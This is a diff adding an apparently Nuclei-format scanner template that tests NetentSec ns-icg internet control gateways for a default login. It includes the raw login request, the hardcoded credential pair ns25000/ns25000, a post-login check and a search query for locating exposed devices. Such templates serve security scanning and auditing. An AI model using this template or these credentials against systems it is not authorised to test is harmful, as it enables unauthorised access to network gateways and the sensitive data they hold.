@@ -1,0 +1,48 @@
+id: nsicg-default-login
+
+info:
+  name: Ns-icg Default Login
+  author: pikpikcu
+  severity: high
+  description: |
+    There is a weak password vulnerability in NetentSec Internet Control Gateway ns-icg of Beijing NetentScience and Technology Co., Ltd., which allows attackers to successfully log in to the system and obtain sensitive information by exploiting this loophole.
+  reference: |
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08603
+  metadata:
+    verified: true
+    fofa-query: "NS-ICG"
+  tags: nsicg,default-login
+
+requests:
+  - raw:
+      - |
+        @timeout: 25s
+        POST /user/login/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        usrname={{username}}&pass={{password}}&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree=
+
+      - |
+        @timeout: 25s
+        GET /user/main HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}/user/login/
+
+    attack: pitchfork
+    payloads:
+      username:
+        - ns25000
+      password:
+        - ns25000
+
+    cookie-reuse: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(all_headers_1, "/user/main/")'
+          - 'status_code_1 == 302'
+          - 'status_code_2 == 200'
+          - contains(body_2, "var loguser = \'ns25000")
+        condition: and
